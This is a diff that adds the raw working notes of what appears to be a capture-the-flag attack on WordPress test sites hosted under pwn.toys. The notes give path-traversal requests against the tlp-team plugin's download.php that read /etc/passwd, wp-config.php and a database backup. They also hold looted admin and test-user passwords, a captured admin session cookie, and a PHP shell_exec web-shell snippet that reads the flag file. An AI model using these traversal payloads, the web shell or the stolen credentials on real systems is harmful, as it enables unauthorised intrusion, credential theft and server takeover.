@@ -1,0 +1,54 @@
+b3b769a1c5166821634b3066d371613c md5, unknown
+
+
+php version 3.0.17
+
+http://6.pwn.toys:32778/wp-includes/
+
+http://5.pwn.toys:32695/xmlrpc.php
+http://5.pwn.toys:32695/readme.html
+http://5.pwn.toys:32695/wp-login.php
+http://5.pwn.toys:32695/wp-content/uploads/2023/
+
+TLP - tram (vulnerable to Path traversal?) TRUE
+s=
+http://5.pwn.toys:32695/wp-content/plugins/tlp-team/README.txt
+
+
+
+\/wp-admin\/admin-ajax.php
+/wp-content/plugins/tlp-team/assets/js/tlpteam.js?ver=4.1.0
+/wp-includes/js/admin-bar.min.js?ver=6.2' id='admin-bar-js'
+
+
+
+/wp-content/plugins/tlp-team/resources/download.php?file=../../../../../../../etc/passwd
+GET /wp-content/plugins/tlp-team/resources/download.php?file=../../../../../../../var/www/html/wp-config.php
+
+7 directories 
+/** Database username */
+define( 'DB_USER', getenv_docker('WORDPRESS_DB_USER', 'example username') );
+/** Database password */
+define( 'DB_PASSWORD', getenv_docker('WORDPRESS_DB_PASSWORD', 'example password') );
+
+
+// Our admin login can stay here until we get a proper vault
+// Username: admin
+// Password: rKtd5kd9UWdT
+
+
+Dummy Users
+Dummy Users for Testing. Password for all dummy users: 422827166731c5a?
+1.pwn.toys:32085/wp-content/plugins/tlp-team/resources/download.php?file=../../../../../../../var/www/html/wp-content/backup-db
+
+cookie:
+wordpress_41ae48353a40abd1abf712252b316589=admin%7C1680530062%7CUglV5y0a5OWpGnzjBACbioCI432Vd4fVel6O7661cRx%7Caba2fd92cffb47841964a1fa31c829575666087d6049a62821ad9c83e8c779d7; wordpress_logged_in_41ae48353a40abd1abf712252b316589=admin%7C1680530062%7CUglV5y0a5OWpGnzjBACbioCI432Vd4fVel6O7661cRx%7Ca60bad9b193a91b1d794ed7c561a3af8eecb7d380899c9fbb041488279a52c1a; wp-settings-time-1=1680357287
+
+
+
+
+<?php
+$output = shell_exec('cat /flag_81d3aa20250d20b11e50b0a3.txt');
+echo "<pre>$output</pre>";
+?>
+
